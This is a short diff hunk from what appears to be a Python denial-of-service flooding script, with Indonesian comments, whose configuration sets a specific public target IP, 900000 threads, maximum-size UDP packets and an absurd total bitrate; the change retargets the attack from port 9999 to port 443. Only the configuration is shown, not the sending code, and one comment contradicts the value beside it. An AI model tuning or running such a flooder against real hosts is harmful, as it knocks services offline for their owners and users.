@@ -12,7 +12,7 @@ import socket, os, threading, time, ipaddress, sys, secrets
 
 # ===== DEFAULT CONFIG (no args) =====
 TARGET_IP      = "139.99.61.184"   # ganti sesuai kebutuhanmu
-TARGET_PORT    = 9999
+TARGET_PORT    = 443
 THREADS        = 900000
 PACKET_SIZE    = 65507              # hindari fragmentasi; jangan pakai 65507
 MBPS_TOTAL     = 1000000009                # total bitrate (Mbit/s) dibagi rata per thread
